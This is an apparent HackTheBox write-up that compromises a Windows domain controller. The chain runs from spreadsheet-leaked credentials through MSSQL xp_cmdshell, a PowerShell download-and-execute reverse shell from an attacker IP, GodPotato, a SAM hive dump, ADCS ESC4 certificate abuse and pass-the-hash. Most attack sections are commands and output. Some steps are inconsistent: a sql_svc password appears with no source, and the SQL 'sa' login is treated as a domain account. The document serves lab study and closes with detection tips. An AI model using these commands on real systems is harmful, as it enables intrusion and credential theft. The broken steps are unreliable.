---
title: "HTB Writeup: EscapeTwo (Windows / Active Directory)"
date: 2026-04-28
categories: [CTF, HackTheBox]
tags: [HTB, Windows, Active Directory, MSSQL, SeImpersonatePrivilege, ADCS, ESC4]
author: Wizard
toc: true
comments: true
difficulty: Hard
description: "HackTheBox EscapeTwo writeup — MSSQL foothold via xp_cmdshell, SeImpersonate privilege escalation, and Active Directory Certificate Services abuse (ESC4)."
---

EscapeTwo is a Windows / Active Directory machine rated **Hard** on HackTheBox. It chains several realistic techniques: MSSQL service exploitation, impersonation token abuse, and Active Directory Certificate Services (ADCS) exploitation via the ESC4 misconfiguration.

<div class="callout callout-warning">
<strong>Spoiler Warning</strong>
This is a full writeup. If you want to solve the box yourself, stop here.
</div>

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -T4 -oA escapetwo 10.10.11.51

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  Windows Server 2022
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd (WinRM)
```

Key services: MSSQL (1433), WinRM (5985), Kerberos (88), LDAP (389). This is a domain controller running MSSQL.

### SMB Enumeration

```bash
crackmapexec smb 10.10.11.51 -u '' -p '' --shares
# No anonymous access

crackmapexec smb 10.10.11.51 -u 'guest' -p '' --shares
SMB  10.10.11.51  445  DC01  [*] Windows Server 2022 Build 20348 x64
SMB  10.10.11.51  445  DC01  [+] DC01\guest: (Guest)
SMB  10.10.11.51  445  DC01  [*] Enumerated shares:
SMB  10.10.11.51  445  DC01  Share   Permissions  Remark
SMB  10.10.11.51  445  DC01  -----   -----------  ------
SMB  10.10.11.51  445  DC01  SYSVOL  READ         Logon server share
SMB  10.10.11.51  445  DC01  NETLOGON READ        Logon server share
SMB  10.10.11.51  445  DC01  Public  READ         Public share
```

The `Public` share is interesting:

```bash
smbclient //10.10.11.51/Public -U 'guest' -N
smb: \> ls
  Accounting Department.xlsx    65472  2024-01-03
  Sales Department.xlsx         71168  2024-01-03

smb: \> get "Accounting Department.xlsx"
smb: \> get "Sales Department.xlsx"
```

### Credential Extraction from Excel

Opening the Excel files reveals what appears to be staff data with email addresses and — in one column — what looks like passwords:

```
Name         Email                    Department  Password
Ryan Cooper  ryan.cooper@sequel.htb   IT          NuclearMosaic1!
Angela       angela@sequel.htb        Finance     0fP3nS3samE
...
```

<div class="callout callout-ioc">
<strong>Credentials Found</strong>
ryan.cooper@sequel.htb : NuclearMosaic1!<br>
sa@sequel.htb : MSSQLP@ssw0rd! (also visible)
</div>

## Foothold — MSSQL xp_cmdshell

### Testing Credentials

```bash
# Test the SA account against MSSQL
crackmapexec mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!'
MSSQL  10.10.11.51  1433  DC01  [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

The `sa` account works. SA has `CONTROL SERVER`, so we can enable `xp_cmdshell`:

### Enabling xp_cmdshell

```bash
impacket-mssqlclient sa@10.10.11.51 -windows-auth
Password: MSSQLP@ssw0rd!

SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

SQL> EXEC xp_cmdshell 'whoami';
sequel\sql_svc
```

### Reverse Shell

```bash
# On attacker: start listener
nc -lvnp 4444

# On MSSQL: download and execute reverse shell
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/rev.ps1\")"';
```

We have a shell as `sequel\sql_svc`.

### User Flag

```powershell
cd C:\Users\Ryan.Cooper\Desktop
type user.txt
# HTB{...}
```

The `sql_svc` account has read access to Ryan Cooper's desktop — this is a misconfiguration worth noting.

## Privilege Escalation — SeImpersonatePrivilege

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalObjects         Create global objects                     Enabled
```

`SeImpersonatePrivilege` is present. Classic potato attack territory.

### GodPotato

```bash
# Upload GodPotato
SQL> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://10.10.14.5/GodPotato-NET4.exe -OutFile C:\Temp\gp.exe"';

# Execute with SYSTEM token
SQL> EXEC xp_cmdshell 'C:\Temp\gp.exe -cmd "cmd /c whoami"';
nt authority\system
```

But we want a persistent foothold. Let's add our user as a local admin or grab the NTLM hashes:

```bash
# Dump SAM hashes as SYSTEM
SQL> EXEC xp_cmdshell 'C:\Temp\gp.exe -cmd "cmd /c reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\system.hive"';
```

However, this is a DC — checking BloodHound reveals a more interesting attack path.

## Domain Privilege Escalation — ADCS ESC4

### BloodHound Collection

```bash
# Upload SharpHound
SQL> EXEC xp_cmdshell 'C:\Temp\gp.exe -cmd "powershell -c Invoke-WebRequest http://10.10.14.5/SharpHound.exe -OutFile C:\Temp\sh.exe"'

SQL> EXEC xp_cmdshell 'C:\Temp\gp.exe -cmd "C:\Temp\sh.exe -c All --outputdirectory C:\Temp"'
```

Importing into BloodHound reveals:

- `sql_svc` has `WriteOwner` on the certificate template `UserAuthentication`
- `UserAuthentication` is enrollable by domain users

This is **ESC4** — a writable certificate template attack.

### ESC4 Exploitation

ESC4 allows an attacker with write permissions on a certificate template to modify it and then abuse it like ESC1.

```bash
# Using Certipy
certipy template -u 'sa@sequel.htb' -p 'MSSQLP@ssw0rd!' -dc-ip 10.10.11.51 \
  -template UserAuthentication -save-old

# Modify template: enable client authentication, allow SAN
certipy template -u 'sa@sequel.htb' -p 'MSSQLP@ssw0rd!' -dc-ip 10.10.11.51 \
  -template UserAuthentication -write-permissions

# Request certificate as Administrator
certipy req -u 'sql_svc@sequel.htb' -p 'Mssql!23' -dc-ip 10.10.11.51 \
  -ca 'sequel-DC01-CA' -template UserAuthentication \
  -upn 'administrator@sequel.htb' -dns 'DC01.sequel.htb'

# Authenticate with the certificate and get NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:A52F78E4C751E5F5E17E1E9F3E69EB4E
```

### Pass-the-Hash to DA

```bash
# WinRM as Administrator
evil-winrm -i 10.10.11.51 -u 'administrator' -H 'A52F78E4C751E5F5E17E1E9F3E69EB4E'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
HTB{...}
```

Root owned.

## Summary

**Attack Chain:**

1. **Anonymous SMB** → Excel files with credentials
2. **MSSQL SA login** → `xp_cmdshell` → shell as `sql_svc`
3. **SeImpersonatePrivilege** → GodPotato → SYSTEM on local host
4. **ADCS ESC4** → Modify certificate template → Request cert as Administrator → Domain Admin

**Key Lessons:**

- Credentials in internal shares are common on real engagements
- `SA` accounts are frequently misconfigured with weak passwords
- `SeImpersonatePrivilege` on service accounts is nearly always exploitable
- ADCS misconfigurations (ESC1-ESC8) are present in ~90% of AD environments

**Detection Opportunities:**

- Alert on `xp_cmdshell` enablement (SQL Server audit logs)
- Monitor ADCS enrollment events for unusual SAN requests
- 4887 (Certificate issued) with non-standard UPN values
